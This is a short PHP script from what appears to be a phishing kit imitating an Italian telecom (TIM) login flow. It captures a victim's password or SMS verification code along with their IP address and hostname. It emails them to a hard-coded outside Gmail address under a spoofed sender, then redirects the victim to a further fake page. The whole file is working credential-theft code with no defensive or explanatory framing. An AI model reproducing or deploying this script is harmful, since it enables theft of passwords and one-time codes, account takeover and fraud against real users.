<?php
$ip = getenv("REMOTE_ADDR");
$url = base64_decode($_GET['url']);
$hostname = gethostbyaddr($ip);
$message .= "[TIM-ROBO]\n";
$message .= "~~~~~~~~~~~~\n";
$message .= "PASSWORD O CODICE SMS : ".$_POST['o14']."\n";
$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "[DON]\n";
$send = "louannedu490@gmail.com";
$subject = "DON[SMS2] $ip";
$headers = "From: [SAT]<sat@online.fr>";
mail($send,$subject,$message,$headers);

echo '<script language="Javascript">
<!--
document.location.replace("./progress3.php");
// -->
</script>';

?>


